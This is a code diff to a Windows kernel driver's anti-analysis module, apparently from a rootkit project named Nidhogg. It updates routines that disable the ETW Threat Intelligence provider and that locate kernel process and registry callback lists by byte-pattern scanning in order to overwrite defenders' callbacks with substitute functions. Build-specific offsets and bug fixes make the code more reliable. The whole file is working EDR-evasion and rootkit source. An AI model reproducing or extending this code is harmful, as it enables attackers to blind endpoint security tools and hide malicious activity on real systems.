@@ -22,6 +22,8 @@ AntiAnalysisHandler::AntiAnalysisHandler() {
 
 _IRQL_requires_max_(APC_LEVEL)
 AntiAnalysisHandler::~AntiAnalysisHandler() {
+	IrqlGuard guard;
+	guard.SetExitIrql(PASSIVE_LEVEL);
 	auto callbackCleaner = [](_In_ DisabledKernelCallback* item) -> void {
 		NidhoggAntiAnalysisHandler->RestoreCallback(item);
 	};
@@ -49,6 +51,10 @@ NTSTATUS AntiAnalysisHandler::EnableDisableEtwTI(_In_ bool enable) {
 	EX_PUSH_LOCK etwThreatIntLock = NULL;
 	ULONG foundIndex = 0;
 	SIZE_T bytesWritten = 0;
+	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
+
+	if (enableProviderInfoOffset == 0)
+		return STATUS_UNSUCCESSFUL;
 
 	// Getting the location of KeInsertQueueApc dynamically to get the real location.
 	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
@@ -59,17 +65,28 @@ NTSTATUS AntiAnalysisHandler::EnableDisableEtwTI(_In_ bool enable) {
 
 	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
 	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPatterns(EtwThreatIntProvRegHandlePatterns,
-		EtwThreatIntProvRegHandlePatternsCount, searchedRoutineAddress, targetFunctionDistance,
+		EtwThreatIntProvRegHandlePatternsCount, 
+		searchedRoutineAddress, 
+		targetFunctionDistance,
 		&foundIndex));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
-	PUCHAR etwThreatIntProvRegHandle = static_cast<PUCHAR>(searchedRoutineAddress) + (*searchedRoutineOffset) + foundIndex +
-		EtwThreatIntProvRegHandleOffset;
-	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
 
-	if (enableProviderInfoOffset == 0)
-		return STATUS_UNSUCCESSFUL;
+	// Getting the address of the ETW-TI provider
+	PUCHAR etwThreatIntProvRegHandle = static_cast<PUCHAR>(searchedRoutineAddress) + 
+		(*searchedRoutineOffset) + 
+		foundIndex;
+	LONG versionDependentOffset = 0;
+
+	for (Pattern pattern : EtwThreatIntProvRegHandlePatterns) {
+		versionDependentOffset = pattern.GetOffsetForVersion(WindowsBuildNumber);
+
+		if (versionDependentOffset != 0) {
+			etwThreatIntProvRegHandle += versionDependentOffset;
+			break;
+		}
+	}
 
 	PTRACE_ENABLE_INFO enableProviderInfo = reinterpret_cast<PTRACE_ENABLE_INFO>(etwThreatIntProvRegHandle +
 		EtwGuidEntryOffset + enableProviderInfoOffset);
@@ -123,6 +140,9 @@ NTSTATUS AntiAnalysisHandler::RestoreCallback(_In_ IoctlKernelCallback& callback
 	__except (EXCEPTION_EXECUTE_HANDLER) {
 		return GetExceptionCode();
 	}
+
+	if (!callbackEntry)
+		return STATUS_NOT_FOUND;
 	return RestoreCallback(callbackEntry);
 }
 
@@ -253,6 +273,7 @@ NTSTATUS AntiAnalysisHandler::ReplaceCallback(_In_ IoctlKernelCallback& callback
 					callbackEntry.CallbackAddress = callback.CallbackAddress;
 					callbackEntry.CallbackEntry = reinterpret_cast<ULONG64>(currentObjectCallback->Entry);
 					callbackEntry.Type = callback.Type;
+					status = STATUS_SUCCESS;
 					break;
 				}
 			}
@@ -328,7 +349,8 @@ NTSTATUS AntiAnalysisHandler::ListRegistryCallbacks(_Inout_ IoctlCallbackList<Cm
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS AntiAnalysisHandler::ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlCallbackList<CmCallback>* callbacks,
-	_In_opt_ ULONG64 replacerFunction, _In_opt_ ULONG64 replacedFunction) {
+	_In_opt_ ULONG64 replacerFunction, 
+	_In_opt_ ULONG64 replacedFunction) {
 	MemoryGuard guard;
 	NTSTATUS status = STATUS_SUCCESS;
 	PCM_CALLBACK currentCallback = NULL;
@@ -345,53 +367,90 @@ NTSTATUS AntiAnalysisHandler::ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlC
 		PUCHAR searchedRoutineAddress = reinterpret_cast<PUCHAR>(CmRegisterCallback);
 		SIZE_T targetFunctionDistance = CmpRegisterCallbackInternalSignatureDistance;
 
-		PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, searchedRoutineAddress,
-			targetFunctionDistance, &foundIndex));
+		PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern,
+			searchedRoutineAddress,
+			targetFunctionDistance,
+			&foundIndex));
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
 
 		// Find the function that holds the valuable information: CmpInsertCallbackInListByAltitude.
-		searchedRoutineAddress = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
+		searchedRoutineAddress = searchedRoutineAddress + 
+			*(searchedRoutineOffset) + 
+			foundIndex +
 			CallFunctionOffset;
 		targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;
 
-		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CmpInsertCallbackInListByAltitudePattern, searchedRoutineAddress,
-			targetFunctionDistance, &foundIndex));
+		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CmpInsertCallbackInListByAltitudePattern, 
+			searchedRoutineAddress,
+			targetFunctionDistance, 
+			&foundIndex));
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
 
-		searchedRoutineAddress = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
+		searchedRoutineAddress = searchedRoutineAddress + 
+			*(searchedRoutineOffset) + 
+			foundIndex +
 			CmpInsertCallbackInListByAltitudeOffset;
 
 		// Get CallbackListHead and CmpCallBackCount.
 		targetFunctionDistance = CallbackListHeadSignatureDistance;
-		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallbackListHeadPattern, searchedRoutineAddress,
-			targetFunctionDistance, &foundIndex));
+		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallbackListHeadPattern, 
+			searchedRoutineAddress,
+			targetFunctionDistance, 
+			&foundIndex));
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
 
-		PUCHAR callbacksList = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;
+		PUCHAR callbacksList = searchedRoutineAddress + 
+			*(searchedRoutineOffset) + 
+			foundIndex + 
+			RoutinesListOffset;
 
-		searchedRoutineOffset = static_cast<PLONG>(FindPattern(RoutinesListCountPattern, searchedRoutineAddress,
-			targetFunctionDistance, &foundIndex));
+		searchedRoutineOffset = static_cast<PLONG>(FindPattern(RegistryCallbackListCountPattern,
+			searchedRoutineAddress,
+			targetFunctionDistance, 
+			&foundIndex));
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
 
-		PULONG callbacksListCount = reinterpret_cast<PULONG>(searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
+		PULONG callbacksListCount = reinterpret_cast<PULONG>(searchedRoutineAddress + 
+			*(searchedRoutineOffset) + 
+			foundIndex +
 			CallbacksListCountOffset);
 
+		// After 22H2, need to find CmpLockCallbackListExclusive.
+		if (WindowsBuildNumber >= WIN_11_22H2) {
+			searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern,
+				searchedRoutineAddress,
+				targetFunctionDistance,
+				&foundIndex));
+
+			if (!searchedRoutineOffset)
+				return STATUS_NOT_FOUND;
+
+			searchedRoutineAddress = searchedRoutineAddress +
+				*(searchedRoutineOffset) +
+				foundIndex +
+				CallFunctionOffset;
+		}
+
 		// Get CmpCallbackListLock.
-		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CmpCallbackListLockPattern, searchedRoutineAddress,
-			targetFunctionDistance, &foundIndex));
+		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CmpCallbackListLockPattern, 
+			searchedRoutineAddress,
+			targetFunctionDistance, 
+			&foundIndex));
 
 		if (!searchedRoutineOffset)
 			return STATUS_NOT_FOUND;
 
-		ULONG_PTR callbackListLock = reinterpret_cast<ULONG_PTR>(searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
+		ULONG_PTR callbackListLock = reinterpret_cast<ULONG_PTR>(searchedRoutineAddress + 
+			*(searchedRoutineOffset) + 
+			foundIndex +
 			CmpCallbackListLockOffset);
 		cmCallbacks.sigCallbackList = callbacksList;
 		cmCallbacks.sigCallbackListLock = callbackListLock;
@@ -405,18 +464,11 @@ NTSTATUS AntiAnalysisHandler::ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlC
 		return status;
 	}
 	if (callbacks && callbacks->Callbacks) {
-		status = ProbeAddress(callbacks->Callbacks, *cmCallbacks.sigCallbackListCount * sizeof(CmCallback),
-			*cmCallbacks.sigCallbackListCount * sizeof(CmCallback));
-
-		if (!NT_SUCCESS(status)) {
-			callbacks->Count = *cmCallbacks.sigCallbackListCount;
-			ExReleasePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);
-			return status;
-		}
 		if (!guard.GuardMemory(callbacks->Callbacks, 
-			*cmCallbacks.sigCallbackListCount * sizeof(CmCallback), UserMode)) {
+			*cmCallbacks.sigCallbackListCount * sizeof(CmCallback), 
+			UserMode)) {
 			ExReleasePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);
-			return STATUS_INSUFFICIENT_RESOURCES;
+			return STATUS_INVALID_ADDRESS;
 		}
 	}
 	currentCallback = reinterpret_cast<PCM_CALLBACK>(cmCallbacks.sigCallbackList);
@@ -494,14 +546,16 @@ NTSTATUS AntiAnalysisHandler::ListPsNotifyRoutines(_Inout_ IoctlCallbackList<PsR
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS AntiAnalysisHandler::ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCallbackList<PsRoutine>* callbacks,
-	_In_opt_ ULONG64 replacerFunction, _In_opt_ ULONG64 replacedFunction) {
+	_In_opt_ ULONG64 replacerFunction, 
+	_In_opt_ ULONG64 replacedFunction) {
 	MemoryGuard guard;
 	NTSTATUS status = STATUS_SUCCESS;
 	PVOID searchedRoutineAddress = NULL;
 	ULONG foundIndex = 0;
 	SIZE_T targetFunctionDistance = 0;
 	SIZE_T listDistance = 0;
-	ULONG64 currentRoutine = 0;
+	ULONG64 currentRoutineAddress = 0;
+	PPS_ROUTINE currentRoutine = nullptr;
 	errno_t err = 0;
 	char* driverName = nullptr;
 	Pattern listSignature = { 0 };
@@ -553,66 +607,94 @@ NTSTATUS AntiAnalysisHandler::ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCa
 		return status;
 	SIZE_T countOffset = RoutinesListOffset;
 
-	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, searchedRoutineAddress,
-		targetFunctionDistance, &foundIndex));
+	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, 
+		searchedRoutineAddress,
+		targetFunctionDistance, 
+		&foundIndex));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	searchedRoutineAddress = static_cast<PUCHAR>(searchedRoutineAddress) + *(searchedRoutineOffset) + foundIndex + 
+	searchedRoutineAddress = static_cast<PUCHAR>(searchedRoutineAddress) + 
+		*(searchedRoutineOffset) + 
+		foundIndex + 
 		CallFunctionOffset;
 
-	PLONG routinesListOffset = static_cast<PLONG>(FindPattern(listSignature, searchedRoutineAddress,
-		listDistance, &foundIndex));
+	PLONG routinesListOffset = static_cast<PLONG>(FindPattern(listSignature, 
+		searchedRoutineAddress,
+		listDistance, 
+		&foundIndex));
 
 	if (!routinesListOffset)
 		return STATUS_NOT_FOUND;
 
-	PUCHAR routinesList = static_cast<PUCHAR>(searchedRoutineAddress) + *(routinesListOffset) + foundIndex + RoutinesListOffset;
+	PULONG64 routinesList = reinterpret_cast<PULONG64>(static_cast<PUCHAR>(searchedRoutineAddress) +
+		*(routinesListOffset) + 
+		foundIndex + 
+		RoutinesListOffset);
 
-	PLONG routinesLengthOffset = static_cast<PLONG>(FindPattern(RoutinesListCountPattern, searchedRoutineAddress,
-		listDistance, &foundIndex));
+	PLONG routinesLengthOffset = static_cast<PLONG>(FindPatterns(RoutinesListCountPatterns,
+		RoutinesListCountPatternsCount,
+		searchedRoutineAddress,
+		listDistance, 
+		&foundIndex));
 
 	if (!routinesLengthOffset)
 		return STATUS_NOT_FOUND;
 
-	if (callbacks->Type == PsCreateProcessType)
-		countOffset = PsNotifyRoutinesRoutineCountOffset;
+	if (callbacks->Type == PsCreateProcessType) {
+		for (Pattern pattern : RoutinesListCountPatterns) {
+			countOffset = pattern.GetOffsetForVersion(WindowsBuildNumber);
+
+			if (countOffset != 0)
+				break;
+		}
+	}
 	else if (callbacks->Type == PsCreateThreadTypeNonSystemThread)
 		countOffset = PsNotifyRoutinesRoutineCountOffset;
 
-	ULONG routinesCount = *reinterpret_cast<PULONG>(static_cast<PUCHAR>(searchedRoutineAddress) + *(routinesLengthOffset) +
-		foundIndex + countOffset);
+	ULONG routinesCount = *reinterpret_cast<PULONG>(static_cast<PUCHAR>(searchedRoutineAddress) + 
+		*(routinesLengthOffset) +
+		foundIndex + 
+		countOffset);
+
+	if (routinesCount > MAX_ROUTINES) {
+		status = STATUS_UNSUCCESSFUL;
+		return status;
+	}
 
 	if (callbacks && callbacks->Count != routinesCount) {
 		callbacks->Count = routinesCount;
 		return status;
 	}
 	if (callbacks && callbacks->Callbacks) {
-		status = ProbeAddress(callbacks->Callbacks, routinesCount * sizeof(PsRoutine),
-			routinesCount * sizeof(PsRoutine));
+		status = ProbeAddress(callbacks->Callbacks, 
+			routinesCount * sizeof(PsRoutine),
+			__alignof(PsRoutine*));
 
 		if (!NT_SUCCESS(status)) {
 			callbacks->Count = routinesCount;
 			return status;
 		}
 		if (!guard.GuardMemory(callbacks->Callbacks,
-			routinesCount * sizeof(PsRoutine), UserMode)) {
+			routinesCount * sizeof(PsRoutine), 
+			UserMode)) {
 			return STATUS_INSUFFICIENT_RESOURCES;
 		}
 	}
 
 	for (ULONG i = 0; i < routinesCount; i++) {
-		currentRoutine = *reinterpret_cast<PULONG64>(routinesList[i * 8]);
-		currentRoutine &= ROUTINE_MASK;
+		currentRoutineAddress = routinesList[i];
+		currentRoutineAddress &= ROUTINE_MASK;
+		currentRoutine = reinterpret_cast<PPS_ROUTINE>(currentRoutineAddress);
 
-		if (currentRoutine == replacedFunction) {
-			currentRoutine = replacerFunction;
+		if (currentRoutine->RoutineAddress == replacedFunction) {
+			currentRoutine->RoutineAddress = replacerFunction;
 			break;
 		}
 
-		if (callbacks) {
-			callbacks->Callbacks[i].CallbackAddress = *reinterpret_cast<PULONG64>(currentRoutine);
+		if (callbacks && callbacks->Callbacks) {
+			callbacks->Callbacks[i].CallbackAddress = currentRoutine->RoutineAddress;
 
 			__try {
 				driverName = MatchCallback(reinterpret_cast<PVOID>(callbacks->Callbacks[i].CallbackAddress));
@@ -653,9 +735,12 @@ NTSTATUS AntiAnalysisHandler::ListObCallbacks(_Inout_ IoctlCallbackList<ObCallba
 	errno_t err = 0;
 	ULONG index = 0;
 
-	auto CopyDriverName = [&](_In_ POB_CALLBACK_ENTRY currentObjectCallback) {
+	auto CopyDriverName = [&](_In_ POB_CALLBACK_ENTRY currentObjectCallback, _In_ bool isPreCallback) {
 		__try {
-			driverName = MatchCallback(currentObjectCallback->PostOperation);
+			if (isPreCallback)
+				driverName = MatchCallback(currentObjectCallback->PreOperation);
+			else
+				driverName = MatchCallback(currentObjectCallback->PostOperation);
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
 			status = GetExceptionCode();
@@ -706,14 +791,14 @@ NTSTATUS AntiAnalysisHandler::ListObCallbacks(_Inout_ IoctlCallbackList<ObCallba
 		do {
 			if (currentObjectCallback->Enabled) {
 				if (currentObjectCallback->PostOperation) {
-					status = CopyDriverName(currentObjectCallback);
+					status = CopyDriverName(currentObjectCallback, false);
 
 					if (!NT_SUCCESS(status))
 						break;
 					callbacks->Callbacks[index].PostOperation = currentObjectCallback->PostOperation;
 				}
 				if (currentObjectCallback->PreOperation) {
-					status = CopyDriverName(currentObjectCallback);
+					status = CopyDriverName(currentObjectCallback, true);
 
 					if (!NT_SUCCESS(status))
 						break;
@@ -780,7 +865,7 @@ char* AntiAnalysisHandler::MatchCallback(_In_ PVOID callack) {
 						status = STATUS_UNSUCCESSFUL;
 						break;
 					}
-					err = strcpy_s(driverName, fullPathNameSize, reinterpret_cast<const char*>(modules[i].FullPathName));
+					err = strcpy_s(driverName, fullPathNameSize + 1, reinterpret_cast<const char*>(modules[i].FullPathName));
 
 					if (err != 0) {
 						status = STATUS_UNSUCCESSFUL;
@@ -886,6 +971,9 @@ bool AntiAnalysisHandler::RemoveCallback(_In_ DisabledKernelCallback* callback) 
 	}
 	DisabledKernelCallback* entry = FindListEntry<CallbackList, DisabledKernelCallback, DisabledKernelCallback*>(*list, 
 		callback, finder);
+
+	if (!entry)
+		return false;
 	return RemoveListEntry<CallbackList, DisabledKernelCallback>(list, entry);
 }
 
